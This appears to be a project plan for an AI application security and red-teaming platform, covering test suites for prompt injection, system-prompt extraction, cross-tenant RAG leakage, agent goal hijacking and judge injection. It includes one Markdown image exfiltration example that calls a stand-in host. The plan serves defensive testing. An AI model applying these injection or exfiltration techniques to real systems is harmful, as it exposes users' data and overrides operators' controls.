# AegisAI — Project Plan & Technical Feasibility Assessment

**Document Status:** Phase 1 — Research & Architecture (Baseline v1.0)  
**Author:** Principal Software Architect & Lead AI Security Engineer  
**Target System:** AegisAI — AI Application Security Assessment & Red Teaming Platform  

---

## 1. Executive Summary & Architectural Stance

AegisAI aims to provide an enterprise-grade, modular security assessment platform for AI-integrated applications spanning **Large Language Models (LLMs)**, **Retrieval-Augmented Generation (RAG) pipelines**, and **Autonomous/Semi-Autonomous AI Agents**.

As Principal Architect, my first responsibility is to separate **what is deterministically and probabilistically verifiable** from **security theater**. Many existing "AI scanners" fail in production because they:
1. Confuse model alignment/content-moderation failures (e.g., generating edgy text) with **application-layer security vulnerabilities** (e.g., cross-tenant RAG leakage, SSRF via agent tools, or unescaped Markdown/HTML XSS sinks).
2. Claim to detect infrastructure or internal pipeline flaws (such as "insecure chunking" or "vector database misconfiguration") via purely black-box chat endpoints where those internal mechanics are mathematically unobservable.
3. Use an LLM judge as the sole source of truth without deterministic canary verification, leading to high false-positive rates and non-reproducible reports.

This document establishes the technical feasibility boundaries, challenges unrealistic assumptions in the initial product vision, defines a disciplined MVP scope, and specifies acceptance criteria for AegisAI.

---

## 2. Challenging Assumptions & Technical Feasibility Assessment

### 2.1 Critical Distinction: Black-Box LLM vs. RAG vs. Agent vs. Infrastructure Assessment

A core requirement of AegisAI is to attribute vulnerabilities to specific architectural components (e.g., *chunking*, *vector similarity search*, *metadata filtering*, *tool execution*) and evaluate LLM, RAG, and Agent security. Below is a candid engineering analysis of what each testing modality can and **cannot** detect.

| Assessment Target / Vulnerability Class | Pure Black-Box Chat Endpoint (HTTP Prompt/Response Only) | Assisted / Grey-Box Assessment (API + Retrieval/Tool Telemetry or Dual-Tenant Credentials) | Configuration & Architecture Manifest Analysis |
| :--- | :--- | :--- | :--- |
| **Direct Prompt Injection & Instruction Override** | **High Feasibility.** Evaluable via canary token reflection, constraint violation probes, and behavioral state checks. | **High Feasibility.** Exact visibility into system prompt vs. user message assembly. | **Medium.** Can flag missing input-rail configurations or weak prompt templates. |
| **System Prompt / Hidden Context Exposure (`LLM08:2026`)** | **Medium-High Feasibility.** Can elicit verbatim or structural system instructions; however, without ground-truth system prompt comparison, hallucinated system prompts must be filtered via multi-sampling consistency checks. | **High Feasibility.** Verbatim cosine/n-gram comparison against the known ground-truth system prompt. | **High Feasibility.** Detects secrets hardcoded in system prompts. |
| **Improper Output Handling (`LLM10:2026`)** | **Medium Feasibility (Payload Generation Only).** Black-box testing can prove the LLM *emits* unescaped XSS, SQLi, or Markdown exfiltration links (`![img](https://canary.invalid/leak?d=...)`), **but cannot prove the downstream UI/sink executes it** unless the response is rendered in an instrumented headless browser or sink harness. | **High Feasibility.** Can inspect downstream sanitizer middleware and sink rendering. | **High Feasibility.** Identifies missing output encoding/CSP policies. |
| **Cross-Tenant RAG Document Leakage (`LLM09:2026`)** | **Impossible with a single unprivileged credential.** Without knowing what privileged/other-tenant documents exist, a black-box scanner cannot distinguish a genuine cross-tenant leak from LLM confabulation. | **High Feasibility (Requires Canary Corpus / Dual-Tenant Harness).** By seeding a "Tenant A" canary document with a cryptographic nonce (`AEGIS-CANARY-9F8A...`) and querying as "Tenant B", detection is **100% deterministic**. | **High Feasibility.** Detects missing tenant-ID filter clauses in vector query configurations. |
| **RAG Component Attribution (Ingestion vs. Chunking vs. Embedding vs. Metadata Filter)** | **Low Feasibility.** Over a single chat endpoint, you only see the final synthesized LLM completion. You cannot reliably distinguish whether a failure occurred at the metadata filter or post-retrieval re-ranker. | **High Feasibility.** When target integration exposes retrieval debug metadata (retrieved chunk IDs, similarity scores, metadata tags) or uses AegisAI's RAG Diagnostic Adapter. | **High Feasibility.** Static inspection of chunk size, overlap, and vector DB ACL settings. |
| **Agent Unauthorized Tool Invocation & Parameter Manipulation (`ASI02`)** | **Low-Medium Feasibility (Unsafe without Sandbox).** Probing a live production agent to invoke tools can trigger real-world side effects (sending emails, modifying DB records). | **High Feasibility (Mock Tool / Canary Webhook Harness).** Target agent is configured with AegisAI non-destructive canary tools/webhooks or returns OpenAI-style `tool_calls` JSON payloads without executing them. | **High Feasibility.** Evaluates tool JSON schemas, missing parameter constraints, and missing HITL gates (`ASI09`). |

### 2.2 Key Architectural Challenges & Proposed Alternatives

1. **Challenge 1: "Identify which RAG component (chunking, embedding, similarity search, metadata filtering) caused the vulnerability" via Black-Box Testing.**
   - *Why the assumption is weak:* In a standard RAG application (`POST /v1/chat`), the vector database, embedding model, and chunker sit behind the application server. An external HTTP caller only receives the final text response. Claiming to pinpoint "insecure chunking" from a chat response alone is scientifically invalid.
   - *Engineered Alternative:* Introduce **Three Target Integration Levels (Assessment Modes)**:
     1. **Level 1 — Black-Box Endpoint Mode:** Evaluates externally observable behaviors (prompt injection, system prompt extraction consistency, PII/secret leakage, unbounded token generation, dangerous output payload emission).
     2. **Level 2 — Harness / Telemetry-Assisted Mode (Recommended for RAG & Agents):** Supports (a) **Dual-Tenant Canary Seeding** (Tenant A & Tenant B credentials + canary document upload or pre-seeded canary identifiers), (b) **Response Telemetry Inspection** (inspecting `tool_calls`, `citations`, `retrieved_chunks` in structured API responses), and (c) **AegisAI Safe Canary Sink** (an internal loopback recorder that verifies whether an agent or RAG pipeline makes unauthorized outbound tool calls or SSRF requests without touching third-party systems).
     3. **Level 3 — Configuration & Architecture Manifest Mode:** Accepts structured JSON/YAML deployment manifests (system prompt definitions, model parameters, RAG vector store config, MCP/tool JSON schemas) to deterministically identify architectural weaknesses (e.g., `C8` Vector DB security, `C9` Agentic execution budgets, `C10` MCP security).

2. **Challenge 2: "Never perform destructive actions during security testing" while testing Agent Tool Execution (`Module C`).**
   - *Why the assumption is risky:* If an AI agent is connected to live mutating tools (`delete_user`, `execute_sql`, `send_wire_transfer`), sending adversarial goal-hijacking payloads against the live agent could cause catastrophic data loss if the attack succeeds.
   - *Engineered Alternative:* Implement a strict **Agent Safety Contract**:
     - For active agent probes, AegisAI either inspects dry-run `tool_calls` output (where the orchestration layer intercepts tool calls before execution) **or** tests against **AegisAI Canary Tools** (read-only/no-op webhook endpoints hosted by the AegisAI Evidence Collector that record invocation parameters safely).
     - Any test marked `mutating_risk = True` requires explicit confirmation that the target is running in a non-production environment or dry-run interception mode.

3. **Challenge 3: Over-Reliance on LLM-as-a-Judge for Vulnerability Detection.**
   - *Why the assumption is weak:* Using an LLM to judge whether another LLM was compromised is vulnerable to judge-injection (where the target's output tricks the evaluator LLM) and high variance.
   - *Engineered Alternative:* Implement a **Two-Stage Hybrid Evaluator**:
     - **Stage 1 (Primary — Deterministic Evaluators):** Cryptographic canary token matching, regex/structural AST parsing (e.g., verifying if valid `<script>` or SQL syntax or restricted JSON tool calls were emitted), n-gram/jaccard similarity against known system prompts, and HTTP status/timing analysis.
     - **Stage 2 (Secondary — Constrained Analytical Judge & Remediation Assistant):** Used only to classify semantic nuances (e.g., whether a partial disclosure is a refusal or a leak) when deterministic signals are ambiguous (`NEEDS_REVIEW`), and to generate contextual remediation guidance grounded strictly in the Framework Knowledge Base.

4. **Challenge 4: Celery + Redis Operational Overhead vs. Local Developer Experience.**
   - *Assessment:* While Celery + Redis is a classic Python choice, running a separate Celery worker, Beat scheduler, Redis broker, FastAPI server, and PostgreSQL instance can create friction during local development or single-node evaluations.
   - *Engineered Alternative:* Design an **Abstract Task Execution Layer (`AssessmentJobRunner`)** backed by **Redis + ARQ (or Celery)** in Docker Compose, with an automatic **In-Process Asyncio Worker Fallback** for lightweight local testing and unit/integration test suites. This gives full distributed worker scalability in production while allowing `pytest` and local dev to run with zero friction.

---

## 3. MVP Scope Definition

Following the requirement to prioritize **reliability and depth over sheer breadth of superficial checks**, the MVP encompasses:

### 3.1 In-Scope for MVP (Phases 1–8)
1. **Core Platform & Security Foundation:**
   - Multi-tenant data isolation (`organization_id` / `user_id` scoping), JWT authentication with RBAC (`ADMIN`, `SECURITY_ENGINEER`, `VIEWER`), encrypted credential vault (AES-256-GCM / Fernet envelope encryption for target API keys), immutable audit logging, and strict SSRF-safe outbound HTTP client.
2. **Modular Assessment Engine:**
   - Plugin-based `SecurityTestRegistry`, `TargetProfiler`, `ArchitectureAnalyzer`, `EvidenceCollector` (with automatic PII/credential redaction), `RiskAssessmentEngine`, `FrameworkMappingEngine`, `RemediationEngine`, and `ReportGenerator`.
3. **Module A — LLM Security Scanner (6 Deep, Multi-Probe Test Suites):**
   - `LLM-PI-001`: Direct Prompt Injection & Instruction Override (Canary & Constraint Bypass).
   - `LLM-PI-002`: Indirect Prompt Injection via External Context Payload.
   - `LLM-SPE-001`: System Prompt & Hidden Context Exposure (`LLM08:2026` / `AML.T0056`).
   - `LLM-SID-001`: Sensitive Information & Credential/PII Disclosure (`LLM02:2026`).
   - `LLM-IOH-001`: Improper Output Handling — XSS, Markdown Image Exfiltration, & Command/SQL Sink Payloads (`LLM10:2026`).
   - `LLM-CFG-001`: Unbounded Consumption & Model Configuration Weakness Analysis (`LLM06:2026`).
4. **Module B — RAG Security Scanner (4 Deep Test Suites):**
   - `RAG-AUTH-001`: Cross-Tenant / Cross-User Retrieval Authorization Bypass (via Dual-Tenant Canary Verification).
   - `RAG-IPI-001`: Indirect Prompt Injection via Retrieved Document Context (`AML.T0051.001` / `AML.T0071`).
   - `RAG-META-001`: Metadata Filter Manipulation & Context Boundary Probing.
   - `RAG-ARCH-001`: RAG Pipeline Configuration & Vector Store Security Audit (Chunking, Embedding, ACLs — `AISVS C8`).
5. **Module C — Agent Security Foundation (3 Core Test Suites):**
   - `AGT-TOOL-001`: Unauthorized Tool Invocation & Parameter Manipulation (Dry-Run / Canary Webhook).
   - `AGT-GH-001`: Agent Goal Hijacking via Untrusted Data (`ASI01`).
   - `AGT-PERM-001`: Excessive Agency, Missing Human-in-the-Loop, & MCP/Tool Schema Audit (`LLM03:2026` / `ASI02` / `ASI03`).
6. **Authoritative Framework Knowledge Base (Versioned JSON/DB Seed):**
   - Verified mappings to **OWASP LLM Top 10 (2026)**, **OWASP Agentic AI Top 10 (2026)**, **OWASP AISVS (v1.0 Chapters C1–C12)**, **NIST AI RMF 1.0 & NIST AI 600-1**, **MITRE ATLAS**, and **ISO/IEC 42001:2023 & ISO/IEC 23894:2023**.
7. **Transparent Risk Scoring & Intelligent Remediation Engine:**
   - Documented **AegisAI AI Vulnerability Scoring System (AVSS v1.0)** combining Base Technical Severity, AI Exploitability (Deterministic vs. Stochastic repeatability), Scope/Blast Radius, and Evidence Confidence.
   - Structured 8-part remediation guidance with deterministic template grounding + optional LLM analytical enrichment.
8. **Enterprise SaaS Frontend & Exportable Reports:**
   - Next.js + TypeScript + Tailwind CSS dark/slate technical UI: Dashboard, New Assessment Wizard (with Scope & Authorization attestation), Live Assessment Progress & Telemetry View, Vulnerability Detail Drawer/Page, Framework Compliance Matrix, and downloadable **HTML/PDF & JSON Security Assessment Reports**.
9. **Built-in Vulnerable AI Target Simulator (For Verification & E2E Testing):**
   - An isolated, opt-in mock target endpoint (`AegisTargetSim`) bundled in the test harness so every scanner module (LLM, RAG cross-tenant leak, Agent tool hijack) can be deterministically verified during automated integration and E2E testing without external API dependencies.

### 3.2 Out-of-Scope for Initial MVP (Planned for Post-MVP Evolution)
- Full AST static source-code scanning of arbitrary repositories (clean `SourceCodeScanner` interface established in Phase 3 for future integration).
- Multi-modal adversarial perturbation attacks (audio/image gradient attacks).
- Automated fine-tuning weight poisoning execution (evaluated via configuration/supply-chain assessment instead).

---

## 4. Acceptance Criteria per Engineering Phase

| Phase | Milestone | Verification & Acceptance Criteria |
| :--- | :--- | :--- |
| **Phase 1** | Research & Architecture | All 6 architecture & security design artifacts (`PROJECT_PLAN.md`, `ARCHITECTURE.md`, `SECURITY_DESIGN.md`, `DATABASE_SCHEMA.md`, `ROADMAP.md`, `THREAT_MODEL.md`) reviewed and approved by Product Owner. |
| **Phase 2** | Project Foundation | FastAPI backend, PostgreSQL schema + Alembic migrations, Auth/RBAC, SSRF guard, credential encryption, Next.js shell, and Docker Compose stack boot cleanly; health & auth integration tests pass. |
| **Phase 3** | Assessment Engine Core | Plugin registry, orchestrator state machine (`PENDING` -> `PROFILING` -> `RUNNING` -> `ANALYZING` -> `COMPLETED`/`FAILED`), normalized `TestResult` contract, and evidence sanitizer verified via unit & integration tests. |
| **Phase 4** | Module A: LLM Scanner | All 6 LLM security test suites execute against both secure and vulnerable target fixtures with reproducible `PASS`/`FAIL`/`NEEDS_REVIEW` outcomes and redacted technical evidence. |
| **Phase 5** | Module B & C: RAG & Agent | RAG cross-tenant canary test, RAG indirect injection, and Agent tool manipulation/schema tests pass against multi-tenant RAG/Agent test harnesses. |
| **Phase 6** | Risk, Frameworks & Reports | Verified knowledge base seeded; AVSS risk calculation produces transparent breakdowns; 8-part remediation and downloadable reports generated accurately. |
| **Phase 7** | Frontend Integration | Complete end-to-end user workflow in Next.js UI connected to real backend APIs (zero mock UI data). |
| **Phase 8** | Validation & Hardening | Full Pytest suite (unit, API, SSRF/auth security tests) and frontend build/component checks pass with zero regressions. |
